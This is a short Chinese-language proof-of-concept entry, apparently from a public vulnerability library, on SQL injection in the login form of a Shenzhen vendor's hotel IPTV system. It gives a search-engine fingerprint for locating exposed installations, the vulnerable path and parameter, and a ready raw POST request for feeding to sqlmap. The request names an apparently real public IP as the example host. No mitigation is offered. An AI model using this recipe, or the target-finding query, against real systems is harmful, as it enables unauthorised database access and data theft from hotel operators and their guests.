---
fofa: "web.title:"
source: "wy876 漏洞文库"
---

# 深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统存在sql注入

# 一、漏洞简介
深圳市子辰视讯科技有限公司酒店智慧营销IPTV系统存在sql注入。

# 二、影响版本
+ 酒店智慧营销IPTV系统

# 三、资产测绘
+ hunter`web.title:"登录 - 酒店智慧营销IPTV系统"`
+ 特征


# 四、漏洞复现
漏洞位置：

```plain
/xsiptva/cniptv/userlogin.php
```


登录界面存在sql注入，username参数sql注入漏洞

```plain
POST /xsiptva/cniptv/userlogin.php HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://1.69.37.165:8880
Connection: close
Referer: http://1.69.37.165:8880/xsiptva/cniptv/userlogin.php
Cookie: PHPSESSID=8kvgnj6bg3vr7ljf12c861s3i4
Upgrade-Insecure-Requests: 1

username=admin&password=admin
```

sqlmap


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bkkb8ze783s6xqap>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
